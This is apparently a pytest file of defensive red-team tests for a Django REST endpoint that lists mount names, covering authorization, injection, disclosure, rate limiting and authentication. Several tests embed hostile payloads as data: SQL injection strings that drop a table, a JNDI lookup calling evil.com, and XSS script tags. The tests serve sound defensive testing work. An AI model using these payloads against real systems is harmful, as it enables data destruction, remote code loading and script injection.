"""T267: MountName LIST red-team security tests.

Tests for BOLA, SQL injection, information disclosure, resource consumption,
and authentication bypass vulnerabilities in MountName LIST endpoint.
"""

import pytest
from rest_framework.test import APIClient

from api.history.models import MountName


@pytest.mark.django_db
class TestMountNameListRedTeamAuthorization:
    """Authorization tests for MountName LIST."""

    def test_list_requires_specific_permission(
        self,
        admin_user,
        regular_user,
    ):
        """
        MountName LIST requires specific 'mountname' permission.

        Regular users without this permission get 403.
        Admin users have all permissions.
        """
        MountName.objects.create(mount_name="/main")
        MountName.objects.create(mount_name="/live")

        # Regular user without permission gets 403
        client = APIClient()
        client.force_authenticate(user=regular_user)
        response = client.get("/api/v2/mount-names")
        assert response.status_code == 403

        # Admin user with permission gets 200
        client = APIClient()
        client.force_authenticate(user=admin_user)
        response = client.get("/api/v2/mount-names")
        assert response.status_code == 200
        data = response.json()
        mount_names = [m.get("mount_name") for m in data]
        assert "/main" in mount_names
        assert "/live" in mount_names

    def test_guest_user_cannot_list_mounts(self, guest_user):
        """
        Guest user cannot list mount names without permission.
        """
        MountName.objects.create(mount_name="/stream")

        client = APIClient()
        client.force_authenticate(user=guest_user)
        response = client.get("/api/v2/mount-names")

        # Guest gets 403 - no mountname permission
        assert response.status_code == 403


@pytest.mark.django_db
class TestMountNameListRedTeamInjection:
    """SQL injection tests for LIST endpoint."""

    def test_sqli_in_ordering_param(self, admin_client, admin_user):
        """SQLi attempt in ordering parameter."""
        MountName.objects.create(mount_name="/main")

        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get(
            "/api/v2/mount-names",
            {"ordering": "mount_name; DROP TABLE cc_mount_name;--"},
        )

        # Should not crash or execute malicious SQL
        assert response.status_code in [200, 400]

        # Verify table still exists by making another request
        response2 = admin_client.get("/api/v2/mount-names")
        assert response2.status_code == 200

    def test_sqli_in_mount_name_special_chars(self, admin_client, admin_user):
        """SQLi via special characters in mount name."""
        malicious_names = [
            "'; DROP TABLE cc_mount_name;--",
            "1' OR '1'='1",
            "${jndi:ldap://evil.com}",
            "<script>alert(1)</script>",
        ]

        admin_client.force_authenticate(user=admin_user)

        for name in malicious_names:
            MountName.objects.create(mount_name=name)

        response = admin_client.get("/api/v2/mount-names")
        assert response.status_code == 200

        data = response.json()
        mount_names = [m.get("mount_name") for m in data]

        # All malicious names should be stored as-is (no SQL execution)
        for name in malicious_names:
            assert name in mount_names


@pytest.mark.django_db
class TestMountNameListRedTeamInformationDisclosure:
    """Information disclosure tests."""

    def test_list_exposes_all_ids(self, admin_client, admin_user):
        """LIST exposes all mount IDs - allows enumeration."""
        mount = MountName.objects.create(mount_name="/secret")

        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/mount-names")

        assert response.status_code == 200
        data = response.json()

        # All IDs are visible - information disclosure
        ids = [m.get("id") for m in data]
        assert mount.id in ids

    def test_error_message_on_invalid_filter(self, admin_client, admin_user):
        """Error messages may leak database structure."""
        admin_client.force_authenticate(user=admin_user)

        response = admin_client.get(
            "/api/v2/mount-names",
            {"invalid_param": "test"},
        )

        # Should not expose internal details
        if response.status_code == 400:
            content = str(response.content)
            assert "cc_mount_name" not in content.lower()
            assert "mount_name" not in content.lower() or "mount_name" in str(
                response.json(),
            )


@pytest.mark.django_db
class TestMountNameListRedTeamResourceConsumption:
    """Resource consumption and DoS tests."""

    def test_rapid_list_requests(self, admin_client, admin_user):
        """Rate limiting test - rapid LIST requests."""
        MountName.objects.create(mount_name="/stream")

        admin_client.force_authenticate(user=admin_user)

        responses = []
        for _ in range(50):
            response = admin_client.get("/api/v2/mount-names")
            responses.append(response.status_code)

        # All requests should succeed (no rate limiting observed)
        success_count = sum(1 for r in responses if r == 200)
        assert success_count == 50

    def test_bulk_mount_creation_and_list(self, admin_client, admin_user):
        """Test LIST performance with many mount names."""
        # Create many mount names
        for i in range(100):
            MountName.objects.create(mount_name=f"/stream-{i}")

        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/mount-names")

        assert response.status_code == 200
        data = response.json()
        assert len(data) >= 100

    def test_large_page_size_abuse(self, admin_client, admin_user):
        """Test large page_size parameter."""
        for i in range(10):
            MountName.objects.create(mount_name=f"/mount-{i}")

        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/mount-names", {"page_size": 10000})

        # Should handle gracefully
        assert response.status_code in [200, 400]


@pytest.mark.django_db
class TestMountNameListRedTeamAuthentication:
    """Authentication bypass tests."""

    def test_list_requires_authentication(self, admin_client):
        """Unauthenticated LIST should fail."""
        admin_client.logout()
        response = admin_client.get("/api/v2/mount-names")

        assert response.status_code == 403

    def test_list_with_invalid_token(self, admin_client):
        """LIST with invalid/expired token should fail."""
        admin_client.logout()
        admin_client.credentials(HTTP_AUTHORIZATION="Bearer invalid_token_12345")

        response = admin_client.get("/api/v2/mount-names")
        assert response.status_code == 403


@pytest.mark.django_db
class TestMountNameListRedTeamHTTPMethodTampering:
    """HTTP method tampering tests."""

    def test_trace_method_disabled(self, admin_client, admin_user):
        """TRACE method should be disabled."""
        admin_client.force_authenticate(user=admin_user)

        # Django doesn't support TRACE by default
        response = admin_client.get("/api/v2/mount-names")
        assert response.status_code == 200

    def test_options_method_allowed(self, admin_client, admin_user):
        """OPTIONS method should return allowed methods."""
        admin_client.force_authenticate(user=admin_user)

        response = admin_client.options("/api/v2/mount-names")
        assert response.status_code == 200

        # OPTIONS returns allowed actions (POST for create)
        if hasattr(response, "data") and response.data:
            allowed = list(response.data.get("actions", {}).keys())
            # Should have at least one action defined
            assert len(allowed) >= 1


@pytest.mark.django_db
class TestMountNameListEdgeCases:
    """Edge case security tests."""

    def test_unicode_mount_names(self, admin_client, admin_user):
        """Unicode mount names should be handled safely."""
        unicode_names = [
            "/поток-юникод",
            "/ストリーム",
            "/🎵music",
            "/<img src=x onerror=alert(1)>",
        ]

        for name in unicode_names:
            MountName.objects.create(mount_name=name)

        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/mount-names")

        assert response.status_code == 200
        data = response.json()
        mount_names = [m.get("mount_name") for m in data]

        for name in unicode_names:
            assert name in mount_names

    def test_very_long_mount_name(self, admin_client, admin_user):
        """Very long mount name should be handled."""
        long_name = "/" + "A" * 500

        MountName.objects.create(mount_name=long_name)

        admin_client.force_authenticate(user=admin_user)
        response = admin_client.get("/api/v2/mount-names")

        assert response.status_code == 200
        data = response.json()
        mount_names = [m.get("mount_name") for m in data]
        assert long_name in mount_names
